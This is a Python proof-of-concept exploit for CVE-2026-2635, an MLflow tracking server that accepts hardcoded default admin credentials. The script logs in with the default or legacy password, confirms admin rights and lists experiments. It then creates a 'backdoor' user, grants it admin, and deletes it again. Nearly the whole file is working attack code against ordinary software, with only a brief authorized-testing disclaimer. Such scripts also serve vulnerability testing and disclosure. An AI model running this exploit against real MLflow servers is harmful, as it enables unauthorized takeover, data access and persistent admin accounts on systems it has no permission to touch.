#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : MLflow Default Credentials Authentication Bypass
# CVE            : CVE-2026-2635
# Vendor         : MLflow (Databricks)
# Product        : MLflow Tracking Server
# Affected       : v2.3.0 – v3.10.0+ (with --app-name basic-auth)
# Type           : CWE-1393 - Use of Default Credentials
# CVSS           : 9.8 (Critical)
# Platform       : Python / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-2635: MLflow Default Credentials Authentication Bypass

Demonstrates that MLflow ships with hardcoded default administrator credentials
in basic_auth.ini. An unauthenticated remote attacker can log in as admin using
the publicly known default credentials.

ATTACK CHAIN:
  1. Verify authentication is enforced (HTTP 401)
  2. Authenticate with default credentials (admin:password1234)
  3. Confirm admin-level access (is_admin: true)
  4. Demonstrate data access (list experiments)
  5. Demonstrate privilege escalation (create backdoor admin user)

PREREQUISITES:
  - MLflow server with --app-name basic-auth enabled
  - Network access to MLflow tracking server (default port 5000)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2026-2635
  - https://www.zerodayinitiative.com/advisories/ZDI-26-111/
"""

import sys
import json
import base64
import urllib.request
import urllib.error
import urllib.parse

# ─── Default Credentials ─────────────────────────────────────────────────────
# These are the hardcoded credentials from mlflow/server/auth/basic_auth.ini
# shipped with every MLflow installation since v2.22.0.
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "password1234"

# Legacy password for v2.3.0 – v2.21.x
LEGACY_PASSWORD = "password"

# ─── ANSI Color Helpers ──────────────────────────────────────────────────────
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def banner():
    print(f"""
{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-2635 — MLflow Default Credentials Auth Bypass    ║
║  Affected: MLflow v2.3.0 – v3.10.0+ with --app-name       ║
║           basic-auth                                        ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def make_request(url, method="GET", data=None, headers=None, auth=None, timeout=10):
    """
    Send an HTTP request using urllib (stdlib only).
    Returns (status_code, response_body_dict_or_None, error_string_or_None).
    """
    if headers is None:
        headers = {}

    if auth:
        cred = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
        headers["Authorization"] = f"Basic {cred}"

    if data is not None and isinstance(data, dict):
        data = json.dumps(data).encode("utf-8")
        headers.setdefault("Content-Type", "application/json")

    req = urllib.request.Request(url, data=data, headers=headers, method=method)

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            try:
                return resp.status, json.loads(body), None
            except json.JSONDecodeError:
                return resp.status, {"raw": body}, None
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        try:
            return e.code, json.loads(body), None
        except json.JSONDecodeError:
            return e.code, {"raw": body}, None
    except urllib.error.URLError as e:
        return None, None, str(e.reason)
    except Exception as e:
        return None, None, str(e)


def exploit(target_host, target_port):
    """Run the full PoC exploit against the target MLflow server."""

    base_url = f"http://{target_host}:{target_port}"
    results = {"steps": [], "success": False}

    # ─── Step 1: Verify authentication is enabled ────────────────────────
    print(f"{BOLD}[Step 1]{RESET} Checking if authentication is enabled on {base_url} ...")

    status, body, err = make_request(f"{base_url}/api/2.0/mlflow/experiments/search")

    if err:
        print(f"  {RED}[FAIL]{RESET} Connection error: {err}")
        results["steps"].append(("auth_check", "FAIL", f"Connection error: {err}"))
        return results

    if status == 401:
        print(f"  {GREEN}[OK]{RESET}   Server returned HTTP 401 — authentication is enforced")
        results["steps"].append(("auth_check", "PASS", "HTTP 401 — auth enforced"))
    elif status == 200:
        print(f"  {YELLOW}[WARN]{RESET} Server returned HTTP 200 without credentials — auth may not be enabled")
        results["steps"].append(("auth_check", "WARN", "HTTP 200 — auth may not be enabled"))
    else:
        print(f"  {YELLOW}[INFO]{RESET} Server returned HTTP {status}")
        results["steps"].append(("auth_check", "INFO", f"HTTP {status}"))

    # ─── Step 2: Authenticate with default credentials ───────────────────
    print(f"\n{BOLD}[Step 2]{RESET} Attempting authentication with default credentials ...")
    print(f"         Username: {DEFAULT_USERNAME}")
    print(f"         Password: {DEFAULT_PASSWORD}")

    auth = (DEFAULT_USERNAME, DEFAULT_PASSWORD)
    status, body, err = make_request(
        f"{base_url}/api/2.0/mlflow/users/get?username={DEFAULT_USERNAME}",
        auth=auth
    )

    if err:
        print(f"  {RED}[FAIL]{RESET} Connection error: {err}")
        results["steps"].append(("default_auth", "FAIL", f"Connection error: {err}"))
        return results

    if status == 200:
        print(f"  {GREEN}[OK]{RESET}   HTTP 200 — Authentication successful with default credentials!")
        results["steps"].append(("default_auth", "PASS", "HTTP 200 — default creds accepted"))
    elif status == 401:
        # Try legacy password
        print(f"  {YELLOW}[INFO]{RESET} HTTP 401 with current password, trying legacy password '{LEGACY_PASSWORD}' ...")
        auth = (DEFAULT_USERNAME, LEGACY_PASSWORD)
        status, body, err = make_request(
            f"{base_url}/api/2.0/mlflow/users/get?username={DEFAULT_USERNAME}",
            auth=auth
        )
        if status == 200:
            print(f"  {GREEN}[OK]{RESET}   HTTP 200 — Authentication successful with LEGACY credentials!")
            results["steps"].append(("default_auth", "PASS", "HTTP 200 — legacy creds accepted"))
        else:
            print(f"  {RED}[FAIL]{RESET} HTTP {status} — default credentials rejected")
            results["steps"].append(("default_auth", "FAIL", f"HTTP {status} — creds rejected"))
            return results
    else:
        print(f"  {RED}[FAIL]{RESET} Unexpected HTTP {status}")
        results["steps"].append(("default_auth", "FAIL", f"HTTP {status}"))
        return results

    # ─── Step 3: Confirm admin-level access ──────────────────────────────
    print(f"\n{BOLD}[Step 3]{RESET} Verifying admin-level access ...")

    user_data = body.get("user", body) if isinstance(body, dict) else {}
    is_admin = user_data.get("is_admin", False)
    username = user_data.get("username", "unknown")
    user_id = user_data.get("id", "unknown")

    if is_admin:
        print(f"  {GREEN}[OK]{RESET}   Confirmed admin access!")
        print(f"         User ID:   {user_id}")
        print(f"         Username:  {username}")
        print(f"         is_admin:  {GREEN}{is_admin}{RESET}")
        results["steps"].append(("admin_confirm", "PASS", f"is_admin=True, id={user_id}"))
    else:
        print(f"  {YELLOW}[WARN]{RESET} Authenticated but is_admin={is_admin}")
        results["steps"].append(("admin_confirm", "WARN", f"is_admin={is_admin}"))

    # ─── Step 4: Demonstrate data access — list experiments ──────────────
    print(f"\n{BOLD}[Step 4]{RESET} Demonstrating data access — listing experiments ...")

    status, body, err = make_request(
        f"{base_url}/api/2.0/mlflow/experiments/search",
        method="POST",
        data={"max_results": 100},
        auth=auth
    )

    if status == 200 and body:
        experiments = body.get("experiments", [])
        print(f"  {GREEN}[OK]{RESET}   Retrieved {len(experiments)} experiment(s)")
        for exp in experiments[:5]:
            exp_id = exp.get("experiment_id", "?")
            exp_name = exp.get("name", "?")
            print(f"         - Experiment {exp_id}: {exp_name}")
        if len(experiments) > 5:
            print(f"         ... and {len(experiments) - 5} more")
        results["steps"].append(("data_access", "PASS", f"{len(experiments)} experiments"))
    else:
        print(f"  {YELLOW}[INFO]{RESET} HTTP {status} — experiment listing returned: {body}")
        results["steps"].append(("data_access", "INFO", f"HTTP {status}"))

    # ─── Step 5: Demonstrate privilege escalation — create user ──────────
    print(f"\n{BOLD}[Step 5]{RESET} Demonstrating privilege escalation — creating a new user ...")

    backdoor_user = "cve_2026_2635_poc"
    backdoor_pass = "poc_password1234"

    status, body, err = make_request(
        f"{base_url}/api/2.0/mlflow/users/create",
        method="POST",
        data={"username": backdoor_user, "password": backdoor_pass},
        auth=auth
    )

    if status == 200 and body:
        new_user = body.get("user", body)
        new_id = new_user.get("id", "?")
        print(f"  {GREEN}[OK]{RESET}   Created user '{backdoor_user}' (ID: {new_id})")
        results["steps"].append(("user_create", "PASS", f"user={backdoor_user}, id={new_id}"))

        # Grant admin to the new user
        print(f"         Granting admin privileges to '{backdoor_user}' ...")
        status2, body2, err2 = make_request(
            f"{base_url}/api/2.0/mlflow/users/update-admin",
            method="PATCH",
            data={"username": backdoor_user, "is_admin": True},
            auth=auth
        )
        if status2 == 200:
            print(f"  {GREEN}[OK]{RESET}   '{backdoor_user}' is now an admin — persistent backdoor established")
            results["steps"].append(("admin_grant", "PASS", f"admin granted to {backdoor_user}"))
        else:
            print(f"  {YELLOW}[INFO]{RESET} Admin grant returned HTTP {status2}")
            results["steps"].append(("admin_grant", "INFO", f"HTTP {status2}"))

        # Clean up: delete the PoC user
        print(f"         Cleaning up — deleting PoC user '{backdoor_user}' ...")
        status3, _, _ = make_request(
            f"{base_url}/api/2.0/mlflow/users/delete",
            method="DELETE",
            data={"username": backdoor_user},
            auth=auth
        )
        if status3 == 200:
            print(f"  {GREEN}[OK]{RESET}   Cleanup successful — PoC user deleted")
        else:
            print(f"  {YELLOW}[INFO]{RESET} Cleanup returned HTTP {status3}")

    elif status == 409 or (body and "RESOURCE_ALREADY_EXISTS" in str(body)):
        print(f"  {YELLOW}[INFO]{RESET} User '{backdoor_user}' already exists (from previous run)")
        results["steps"].append(("user_create", "INFO", "User already exists"))
    else:
        print(f"  {RED}[FAIL]{RESET} User creation returned HTTP {status}: {body}")
        results["steps"].append(("user_create", "FAIL", f"HTTP {status}"))

    # ─── Summary ─────────────────────────────────────────────────────────
    passed = sum(1 for _, s, _ in results["steps"] if s == "PASS")
    total = len(results["steps"])
    results["success"] = passed >= 3  # auth check + default auth + admin confirm

    print(f"\n{BOLD}{'═' * 62}{RESET}")
    if results["success"]:
        print(f"{BOLD}{GREEN}[VULNERABLE]{RESET} CVE-2026-2635 confirmed — {passed}/{total} checks passed")
        print(f"""
{BOLD}Exploitation Summary:{RESET}
  • Default credentials accepted: {DEFAULT_USERNAME}:{auth[1]}
  • Admin access confirmed (bypasses all authorization checks)
  • Full read/write/delete access to all MLflow resources
  • Ability to create/delete users and grant admin privileges
  • No prior authentication required — pre-auth vulnerability
""")
    else:
        print(f"{BOLD}{RED}[NOT VULNERABLE]{RESET} Default credentials rejected — {passed}/{total} checks passed")

    return results


if __name__ == "__main__":
    banner()

    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000

    print(f"Target: {target}:{port}\n")

    result = exploit(target, port)
    sys.exit(0 if result["success"] else 1)
